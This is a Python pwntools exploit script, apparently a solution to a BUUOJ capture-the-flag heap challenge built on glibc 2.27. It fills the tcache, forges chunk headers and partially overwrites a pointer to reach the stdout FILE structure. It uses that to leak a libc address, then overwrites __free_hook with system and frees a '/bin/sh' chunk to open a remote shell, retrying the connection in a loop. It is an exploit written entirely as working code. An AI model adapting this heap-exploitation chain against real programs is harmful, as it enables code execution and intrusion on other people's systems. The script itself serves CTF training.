from pwn import *
from LibcSearcher import *

libc = ELF('libc-2.27.so')


def realloc(size, content):
    target.sendlineafter('>> ', '1')
    target.sendlineafter('Size?\n', str(size))
    target.sendafter('Content?\n', content)


def free():
    target.sendlineafter('>> ', '2')


def exit():
    target.sendlineafter('>> ', '3')

# Restore to nullptr.
def back():
    target.sendlineafter('>> ', '666')


def pwn():
    realloc(0x30, 'a')
    realloc(0x0, '')
    realloc(0x80, 'a')
    realloc(0x0, '')
    # Prevent top chunk consolidation.
    realloc(0x40, 'a')
    realloc(0x0, '')

    realloc(0x80, 'a')
    # Get chunk B and we then free it 7 times to fill tcache.
    for i in range(7):
        free()

    # This chunk is inserted into `main_arena + 0x60` (unsorted bin) because tcache is full.
    realloc(0x0, '')

    realloc(0x30, 'a')
    io_offset = 0xc7  # We do not know. This is a random number.

    # Fake chunk.
    payload = p64(0x0) * 7 + p64(0x51) + p8(0x60) + p8(io_offset)
    realloc(0x50, payload)
    # Then we free it. Since size is corrupted, it won't go back to the previous list.
    realloc(0x0, '')

    # ptr => 0x30. Now we lack 0x50.
    # 0x80 is available!
    realloc(0x80, 'a')
    # Modified from main_arena to io_2_1.
    realloc(0x0, '')

    # This time, we can manipulate io_stdout.
    payload = p64(0xfbad1887) + p64(0x0) * 3 + p8(0x58)
    realloc(0x80, payload)

    addr = u64(target.recvuntil(b'\x7f', timeout=0.1)[-6:].ljust(8, b'\x00'))
    if addr == 0:
        return

    print(hex(addr))
    free_hook = addr + 0x5648
    libc_base = free_hook - libc.sym['__free_hook']
    system = libc_base + libc.sym['system']

    back()

    realloc(0x20, 'a')
    realloc(0, '')
    realloc(0x90, 'a')
    realloc(0, '')
    realloc(0x40, 'a')
    realloc(0, '')

    realloc(0x90, 'a')
    for i in range(7):
        free()
    realloc(0, '')

    realloc(0x20, 'a')
    payload = p64(0)*5 + p64(0x71) + p64(free_hook-0x8)
    realloc(0x70, payload)
    realloc(0, '')

    realloc(0x90, 'b')
    realloc(0, '')
    realloc(0x90, b'/bin/sh\x00' + p64(system))
    free()

    target.interactive()


while True:
    try:
        target = remote('node4.buuoj.cn', 27592)
        pwn()

    except:
        target.close()
